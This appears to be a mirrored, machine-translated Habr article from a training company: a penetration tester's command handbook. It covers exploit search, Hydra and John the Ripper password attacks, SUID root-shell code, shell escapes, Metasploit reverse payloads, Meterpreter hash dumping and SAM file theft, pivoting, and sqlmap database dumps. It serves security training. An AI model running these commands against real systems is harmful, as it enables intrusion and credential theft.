<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Pentestit Corporate Laboratories: Case Analysis for Penetration Testing</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pentestit corporate laboratories are unique in their format and content, practical information security training courses, developed on the basis of th...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Pentestit Corporate Laboratories: Case Analysis for Penetration Testing</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/251/60d/569/25160d5695974ff393c714703a791adb.png" alt="image"></div><br><p>  Pentestit corporate laboratories are unique in their format and content, practical information security training courses, developed on the basis of the best penetration testing practices and security analysis, comparable in content to hacker conferences.  Regardless of the training programs, their key features are relevant material and practical training in pentest laboratories, making up 80% of the total program of the course.  <strong>In this article we will continue to analyze the basis of commands and useful tricks when conducting penetration testing.</strong> </p><a name="habracut"></a><br><h2>  Handbook pentester part 2 </h2><br><p>  This handbook is a list of commands that you may need when conducting penetration testing.  This handbook is designed in such a way that it does not provide a detailed description of the commands, but only gives working examples.  For more information about the team or utility, we recommend that you study its man page or visit the official website. </p><br><p>  This handbook is more concerned with network and infrastructure testing.  Testing web applications is not covered in this reference, except for a few examples with sqlmap at the end of this tutorial.  <a href="https://habrahabr.ru/company/pentestit/blog/322834/">The first part of the directory.</a> </p><br><h3>  Search for exploits for detected services </h3><br><p>  Search for exploit-db through searchsploit, in this example, search for elevation elevation for windows 2003: </p><br><pre><code class="hljs perl">searchsploit windows <span class="hljs-number"><span class="hljs-number">2003</span></span> | <span class="hljs-keyword"><span class="hljs-keyword">grep</span></span> -i <span class="hljs-keyword"><span class="hljs-keyword">local</span></span></code> </pre> <br><p>  Using google to search the site exploit-db.com: </p><br><pre> <code class="hljs">site:exploit-db.com exploit kernel &lt;= 3</code> </pre> <br><p>  Look for suitable meta-explosive modules with grep.  Standard search using search in msf works worse: </p><br><pre> <code class="hljs pgsql">grep -R "W7" /usr/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>/metasploit-framework/modules/exploit/windows<span class="hljs-comment"><span class="hljs-comment">/*</span></span></code> </pre> <br><p>  Install a local copy of the exploit-db database: </p><br><pre> <code class="hljs perl">searchsploit ‚Äìu searchsploit apache <span class="hljs-number"><span class="hljs-number">2.2</span></span> searchsploit <span class="hljs-string"><span class="hljs-string">"Linux Kernel"</span></span> searchsploit linux <span class="hljs-number"><span class="hljs-number">2.6</span></span> | <span class="hljs-keyword"><span class="hljs-keyword">grep</span></span> -i ubuntu | <span class="hljs-keyword"><span class="hljs-keyword">grep</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span></code> </pre> <br><p>  Compiling exploits for Windows in Kali: </p><br><pre> <code class="hljs ruby">wget -O mingw-get-setup.exe <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/sourceforge.net/projects</span></span><span class="hljs-regexp"><span class="hljs-regexp">/mingw/files</span></span><span class="hljs-regexp"><span class="hljs-regexp">/Installer/mingw</span></span>-get-setup.exe/download wine mingw-get-setup.exe select mingw32-base cd /root/.wine/drive_c/windows wget <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/gojhonny.com/misc</span></span><span class="hljs-regexp"><span class="hljs-regexp">/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip cd /root</span></span><span class="hljs-regexp"><span class="hljs-regexp">/.wine/drive</span></span>_c/MinGW/bin wine gcc -o ability.exe /tmp/exploit.c -lwsock32 wine ability.exe</code> </pre> <br><p>  Compilation for x32 and x64 architects: </p><br><pre> <code class="hljs swift">gcc -m32 -o output32 hello.<span class="hljs-built_in"><span class="hljs-built_in">c</span></span> (<span class="hljs-number"><span class="hljs-number">32</span></span> bit) gcc -m64 -o output hello.<span class="hljs-built_in"><span class="hljs-built_in">c</span></span> (<span class="hljs-number"><span class="hljs-number">64</span></span> bit)</code> </pre> <br><h3>  Run a simple local web server </h3><br><p>  Useful for delivering exploits and programs to the target machine.  Run a simple http web server in Python: </p><br><pre> <code class="hljs mel"><span class="hljs-keyword"><span class="hljs-keyword">python</span></span> -m SimpleHTTPServer <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br><p>  Run a simple Python3 web server: </p><br><pre> <code class="hljs pgsql">python3 -m http.<span class="hljs-keyword"><span class="hljs-keyword">server</span></span></code> </pre> <br><p>  Starting a simple Ruby webrick http server: </p><br><pre> <code class="hljs dos">ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port =&gt; <span class="hljs-number"><span class="hljs-number">80</span></span>, :DocumentRoot =&gt; <span class="hljs-built_in"><span class="hljs-built_in">Dir</span></span>.pwd).<span class="hljs-built_in"><span class="hljs-built_in">start</span></span>"</code> </pre> <br><p>  Run a simple php http server: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">php</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-S</span></span> 0<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:80</span></span></code> </pre> <br><h3>  Mounting file resources </h3><br><p>  Mounting a NFS resource in / mnt / nfs: </p><br><pre> <code class="hljs ruby">mount <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">1.1</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/vol/share</span></span> /mnt/nfs</code> </pre> <br><p>  Mounting a Windows CIFS / SMB resource on Linux in / mnt / cifs If you delete the password, you will be asked about it in the console (a safer option, since it will not be written in bash.history): </p><br><pre> <code class="hljs pgsql">mount -t cifs -o username=<span class="hljs-keyword"><span class="hljs-keyword">user</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>=pass,<span class="hljs-keyword"><span class="hljs-keyword">domain</span></span>=bla //<span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span>.X/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>-<span class="hljs-type"><span class="hljs-type">name</span></span> /mnt/cifs</code> </pre> <br><p>  Mounting a Windows resource on Windows from the command line: </p><br><pre> <code class="hljs sql">net <span class="hljs-keyword"><span class="hljs-keyword">use</span></span> Z: \\win-<span class="hljs-keyword"><span class="hljs-keyword">server</span></span>\<span class="hljs-keyword"><span class="hljs-keyword">share</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> /<span class="hljs-keyword"><span class="hljs-keyword">user</span></span>:<span class="hljs-keyword"><span class="hljs-keyword">domain</span></span>\johndoe /savecred /p:<span class="hljs-keyword"><span class="hljs-keyword">no</span></span></code> </pre> <br><p>  Installing smb4k on Kali, a useful Linux GUI to view SMB resources: </p><br><pre> <code class="hljs swift">apt-<span class="hljs-keyword"><span class="hljs-keyword">get</span></span> install smb4k -y</code> </pre> <br><h3>  Examining HTTP / HTTPS Web Servers </h3><br><p>  Run nikto scan: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">nikto</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-h</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span></code> </pre> <br><p>  Configurable via GUI, CLI input usually does not work: </p><br><pre> <code class="hljs">dirbuster</code> </pre> <br><p>  Simple directory bruteformer: </p><br><pre> <code class="hljs objectivec">dirb http:<span class="hljs-comment"><span class="hljs-comment">//example.org</span></span></code> </pre> <br><p>  Advanced directory and file bruteformer.  Search for files with php and js extension using the dictionary: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">dirsearch</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.py</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">--random-agents</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-u</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">example</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.org</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-e</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">php</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">js</span></span></code> </pre> <br><h3>  Network packet analysis </h3><br><p>  tcpdump for port 80 on interface eth0, output to output.pcap: </p><br><pre> <code class="hljs matlab">tcpdump tcp port <span class="hljs-number"><span class="hljs-number">80</span></span> -w output.pcap -<span class="hljs-built_in"><span class="hljs-built_in">i</span></span> eth0</code> </pre> <br><h3>  Credential Detection </h3><br><p>  Several techniques to learn credentials from remote services. </p><br><h4>  SMB </h4><br><p>  Collection of SMB users: </p><br><pre> <code class="hljs mel"><span class="hljs-keyword"><span class="hljs-keyword">python</span></span> /usr/share/doc/<span class="hljs-keyword"><span class="hljs-keyword">python</span></span>-impacket-doc/examples/samrdump.py <span class="hljs-number"><span class="hljs-number">192.168</span></span>.XXX.XXX</code> </pre> <br><p>  RID cycle SMB / collection of SMB users </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">ridenum</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.py</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.XXX</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.XXX</span></span> 500 50000 <span class="hljs-selector-tag"><span class="hljs-selector-tag">dict</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.txt</span></span></code> </pre> <br><h4>  SNMP </h4><br><p>  Collection of SNMP users: </p><br><pre> <code class="hljs pgsql">snmpwalk <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> -v1 <span class="hljs-number"><span class="hljs-number">192.168</span></span>.X.XXX <span class="hljs-number"><span class="hljs-number">1</span></span> |grep <span class="hljs-number"><span class="hljs-number">11.11</span></span><span class="hljs-number"><span class="hljs-number">.11</span></span><span class="hljs-number"><span class="hljs-number">.11</span></span> |cut -d‚Äù ‚Äú -f4 python /usr/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>/doc/python-impacket-doc/examples/samrdump.py SNMP <span class="hljs-number"><span class="hljs-number">192.168</span></span>.X.XXX nmap -sT -p <span class="hljs-number"><span class="hljs-number">161</span></span> <span class="hljs-number"><span class="hljs-number">192.168</span></span>.X.XXX/<span class="hljs-number"><span class="hljs-number">254</span></span> -oG snmp_results.txt</code> </pre> <br><h3>  Brutfors network services </h3><br><p>  Hydra FTP brute force </p><br><pre> <code class="hljs pgsql">hydra -l USERNAME -P /usr/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>/wordlistsnmap.lst -f <span class="hljs-number"><span class="hljs-number">192.168</span></span>.X.XXX ftp -V</code> </pre> <br><p>  Hydra pop3 brute force </p><br><pre> <code class="hljs pgsql">hydra -L users.txt -P /usr/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>/wordlistsnmap.lst <span class="hljs-number"><span class="hljs-number">192.168</span></span>.X.XXX pop3 -V</code> </pre> <br><p>  Hydra SMTP brute force </p><br><pre> <code class="hljs pgsql">hydra -l <span class="hljs-keyword"><span class="hljs-keyword">user</span></span>@example.com -P /usr/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>/wordlistsnmap.lst <span class="hljs-number"><span class="hljs-number">192.168</span></span>.X.XXX smtp -V</code> </pre> <br><h3>  Brute force passwords john the ripper </h3><br><p>  Hacking with a dictionary </p><br><pre> <code class="hljs ruby">john --wordlist=<span class="hljs-regexp"><span class="hljs-regexp">/usr/share</span></span><span class="hljs-regexp"><span class="hljs-regexp">/wordlists/rockyou</span></span>.txt hashes</code> </pre> <br><p>  MD5 hacking with a dictionary </p><br><pre> <code class="hljs pgsql">john <span class="hljs-comment"><span class="hljs-comment">--format=MD5 --wordlist /usr/share/wordlists/rockyou.txt hash.txt</span></span></code> </pre> <br><p>  DES brute force </p><br><pre> <code class="hljs pgsql">john <span class="hljs-comment"><span class="hljs-comment">--format=DES hash --show</span></span></code> </pre> <br><h3>  SUID </h3><br><p>  It often happens that a vulnerable executable file has a SUID bit, but inside the program itself, the effective UID changes to an unprivileged before a vulnerable call, and we need to get a shell with superuser rights.  To restore root rights and get a shell, you can use the code below. </p><br><p>  SUID C shell for / bin / bash: </p><br><pre> <code class="bash hljs">int main(void){ setresuid(0, 0, 0); system(<span class="hljs-string"><span class="hljs-string">"/bin/bash"</span></span>); }</code> </pre> <br><p>  SUID C shell for / bin / sh: </p><br><pre> <code class="bash hljs">int main(void){ setresuid(0, 0, 0); system(<span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span>); }</code> </pre> <br><p>  Compile suid shell executable file: </p><br><pre> <code class="hljs swift">gcc -o suid suid.<span class="hljs-built_in"><span class="hljs-built_in">c</span></span></code> </pre> <br><p>  For 32 bits: </p><br><pre> <code class="hljs swift">gcc -m32 -o suid suid.<span class="hljs-built_in"><span class="hljs-built_in">c</span></span></code> </pre> <br><h3>  Tty shells </h3><br><p>  Examples of creating TTY shells from a limited shell in Linux, useful for running commands like su from the reverse of the shell.  Python tty shell: </p><br><pre> <code class="hljs mel"><span class="hljs-keyword"><span class="hljs-keyword">python</span></span> -c <span class="hljs-string"><span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span></span> echo os.<span class="hljs-keyword"><span class="hljs-keyword">system</span></span>(<span class="hljs-string"><span class="hljs-string">'/bin/bash'</span></span>)</code> </pre> <br><p>  Getting interactive sh shell: </p><br><pre> <code class="hljs matlab">/bin/sh -<span class="hljs-built_in"><span class="hljs-built_in">i</span></span></code> </pre> <br><p>  Getting the perl tty shell: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">exec</span></span> <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">perl</span></span> -e <span class="hljs-string"><span class="hljs-string">'exec "/bin/sh";'</span></span></code> </pre> <br><p>  Getting Ruby TTY Shell: </p><br><pre> <code class="hljs perl"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span></code> </pre> <br><p>  Getting Lua TTY Shell: </p><br><pre> <code class="hljs lua"><span class="hljs-built_in"><span class="hljs-built_in">os</span></span>.<span class="hljs-built_in"><span class="hljs-built_in">execute</span></span>(<span class="hljs-string"><span class="hljs-string">'/bin/sh'</span></span>)</code> </pre> <br><p>  Getting a TTY shell from Vi: </p><br><pre> <code class="hljs erlang-repl">:!bash</code> </pre> <br><p>  Getting TTY shell via NMAP (old versions) </p><br><pre> <code class="hljs pgsql">nmap <span class="hljs-comment"><span class="hljs-comment">--interactive !sh</span></span></code> </pre> <br><h3>  Metasploit / Meterpreter </h3><br><p>  Windows reverse meterpreter payload with reverse connection: </p><br><pre> <code class="hljs swift"><span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload windows/meterpreter/reverse_tcp</code> </pre> <br><p>  Windows VNC Meterpreter payload </p><br><pre> <code class="hljs swift"><span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload windows/vncinject/reverse_tcp <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> <span class="hljs-type"><span class="hljs-type">ViewOnly</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br><p>  Linux Reverse Meterpreter payload with reverse connection </p><br><pre> <code class="hljs swift"><span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload linux/meterpreter/reverse_tcp</code> </pre> <br><h4>  Meterpreter Handbook </h4><br><p>  Download the file on windows machine via Meterpreter: </p><br><pre> <code class="hljs swift">upload file <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\\windows</code> </pre> <br><p>  Download the file from the target Windows machine via Meterpreter: </p><br><pre> <code class="hljs tex">download c:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">\</span></span></span></span>windows<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">\</span></span></span></span>repair<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">\</span></span></span></span>sam /tmp</code> </pre> <br><p>  Run exe file via Meterpreter - Ideal for executing downloaded exploits: </p><br><pre> <code class="hljs tex">execute -fc:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">\</span></span></span></span>windows<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">temp</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">exploit</span></span></span></span>.exe</code> </pre> <br><p>  Creating a new channel with cmd shell: </p><br><pre> <code class="hljs swift">execute -f cmd -<span class="hljs-built_in"><span class="hljs-built_in">c</span></span></code> </pre> <br><p>  Meterpreter will show processes: </p><br><pre> <code class="hljs">ps</code> </pre> <br><p>  Meterpreter will receive a shell for the current session: </p><br><pre> <code class="hljs">shell</code> </pre> <br><p>  Meterpreter will try to raise privileges in the system: </p><br><pre> <code class="hljs">getsystem</code> </pre> <br><p>  Meterpreter will try to get the hashes of OS users: </p><br><pre> <code class="hljs">hashdump</code> </pre> <br><p>  Meterpreter creates a port redirection through the target machine (pivoting): </p><br><pre> <code class="hljs cs">portfwd <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> ‚Äìl <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìp <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìr target_host</code> </pre> <br><p>  Meterpreter removes port forwarding (pivoting): </p><br><pre> <code class="hljs pgsql">portfwd <span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> ‚Äìl <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìp <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìr target_host</code> </pre> <br><h3>  SQLMap examples </h3><br><p>  Auto mode: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">sqlmap</span></span> -u http://site --forms --batch --crawl=<span class="hljs-number"><span class="hljs-number">10</span></span> --cookie=jsessionid=<span class="hljs-number"><span class="hljs-number">54321</span></span> --level=<span class="hljs-number"><span class="hljs-number">5</span></span> --risk=<span class="hljs-number"><span class="hljs-number">3</span></span></code> </pre> <br><p>  Target scan: </p><br><pre> <code class="hljs cmake">Sqlmap -u <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span> -p PARAM --data=POSTDATA --cookie=COOKIE --level=<span class="hljs-number"><span class="hljs-number">3</span></span> --current-user --current-db --passwords --<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>-read=<span class="hljs-string"><span class="hljs-string">"/var/www/bla.php"</span></span></code> </pre> <br><p>  Scan the url on union + error based injection for mysql and use a random user agent + to get a dump of the database: </p><br><pre> <code class="hljs swift">sqlmap -u <span class="hljs-string"><span class="hljs-string">"http://site/bla.php?id=1"</span></span> --dbms=mysql --tech=<span class="hljs-type"><span class="hljs-type">U</span></span> --random-agent --<span class="hljs-built_in"><span class="hljs-built_in">dump</span></span></code> </pre> <br><p>  Sqlmap form validation per injection: </p><br><pre> <code class="hljs pgsql">sqlmap -o -u "http://site/form/" <span class="hljs-comment"><span class="hljs-comment">--forms</span></span></code> </pre> <br><p>  Sqlmap dump database and hacking hashes for the database table database-name: </p><br><pre> <code class="hljs swift">sqlmap -o -u <span class="hljs-string"><span class="hljs-string">"http://site/vuln-form"</span></span> --forms -<span class="hljs-type"><span class="hljs-type">D</span></span> database-name -<span class="hljs-type"><span class="hljs-type">T</span></span> users --<span class="hljs-built_in"><span class="hljs-built_in">dump</span></span></code> </pre> <br><h3>  Determining the type of hashes </h3><br><p>  It is most convenient to use the hash-identifier utility, but for clarity I will present several types of hashes visually: </p><br><p>  MD5 Hash: </p><br><pre> <code class="hljs">8743b52063cd84097a65d1633f5c74f5</code> </pre> <br><p>  MD5 $ PASS: $ SALT: </p><br><pre> <code class="hljs css">01<span class="hljs-selector-tag"><span class="hljs-selector-tag">dfae6e5d4d90d9892622325959afbe</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:7050461</span></span></code> </pre> <br><p>  MD5 $ SALT: $ PASS: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">f0fda58630310a6dd91a7d8f0a4ceda2</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:4225637426</span></span></code> </pre> <br><p>  SHA1 Hash: </p><br><pre> <code class="hljs">b89eaac7e61417341b710b727768294d0e6a277b</code> </pre> <br><p>  SHA1 $ PASS: $ SALT: </p><br><pre> <code class="hljs css">2<span class="hljs-selector-tag"><span class="hljs-selector-tag">fc5a684737ce1bf7b3b239df432416e0dd07357</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:2014</span></span></code> </pre> <br><p>  SHA1 $ SALT: $ PASS: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">cac35ec206d868b7d7cb0b55f31d9425b075082b</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:5363620024</span></span></code> </pre> <br><p>  SHA-256: </p><br><pre> <code class="hljs go"><span class="hljs-number"><span class="hljs-number">127e6f</span></span>bfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code> </pre> <br><p>  SHA-256 $ PASS: $ SALT: </p><br><pre> <code class="hljs">c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code> </pre> <br><p>  SHA-256 $ SALT: $ PASS: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:560407001617</span></span></code> </pre> <br><p>  SHA-512: </p><br><pre> <code class="hljs">82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code> </pre> <br><p>  SHA-512 $ PASS: $ SALT: </p><br><pre> <code class="hljs">e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code> </pre> <br><p>  SHA-512 $ SALT: $ PASS: </p><br><pre> <code class="hljs">976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code> </pre> <br><p>  NTLM: </p><br><pre> <code class="hljs">b4b9b02e6f09a9bd760f388b67351e2b</code> </pre> <br><h2>  Conclusion </h2><br><p>  In order to successfully resist attackers, it is necessary to know well the methods and tools of work, which is extremely difficult, given their rapid development.  The course program is updated with each set, which allows you to provide relevant and relevant knowledge and practical skills in the field of information security. </p><br><p>  The uniqueness of the course program in the presentation and consolidation of the material - 20% of theory and 80% of practice.  Constantly updating the methodological material and adding practical tasks, we try to give the most complete amount of information so that the course participants receive comprehensive information on current threats and methods of counteraction, open new development vectors in the field of practical information security. </p><br><p>  ‚Üí <a href="https://www.pentestit.ru/courses/corp-lab/">View the course program.</a> </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/325602/">https://habr.com/ru/post/325602/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../325586/index.html">Automation of printing in corporate systems or how to make friends with your ‚Äúbike‚Äù with a printer</a></li>
<li><a href="../325590/index.html">Recursive Moving Average Filter</a></li>
<li><a href="../325592/index.html">Azure-IaaS-Digest # 14 (March)</a></li>
<li><a href="../325596/index.html">This is Science: observing plant growth</a></li>
<li><a href="../325600/index.html">Serious errors in the code CryEngine V</a></li>
<li><a href="../325604/index.html">How a ‚Äútower‚Äù turns into a ‚Äúpyramid‚Äù - using the example of the DNS analysis and filtering example</a></li>
<li><a href="../325606/index.html">Interview with IOHK developer Alexander Chepurny about programming cryptocurrencies and the future of blockchain</a></li>
<li><a href="../325608/index.html">Added the ability to embed JS-scripts in the boards. How we make our project management system</a></li>
<li><a href="../325610/index.html">The book "UX-strategy. What users want and how to give it to them</a></li>
<li><a href="../325612/index.html">MoscowCSS</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>